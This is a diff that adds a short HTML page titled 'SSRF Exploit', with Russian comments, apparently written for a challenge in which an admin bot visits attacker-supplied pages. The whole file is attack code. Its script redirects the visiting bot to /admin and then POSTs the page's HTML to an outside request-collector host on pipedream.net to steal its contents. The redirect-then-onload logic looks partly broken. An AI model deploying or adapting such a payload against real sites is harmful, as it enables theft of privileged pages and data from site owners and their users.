@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SSRF Exploit</title>
+  <script>
+    // Функция для отправки данных на RequestBin
+    function sendData(content) {
+      fetch('https://eoz8oj7phvn6nex.m.pipedream.net', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: content
+      });
+    }
+
+    // Перенаправляем бота на /admin
+    window.location = '/admin';
+
+    // После загрузки страницы /admin отправляем её содержимое на RequestBin
+    window.onload = function() {
+      const content = document.documentElement.innerHTML;
+      sendData(content);
+    };
+  </script>
+</head>
+<body>
+  <!-- Пустая страница -->
+</body>
+</html>
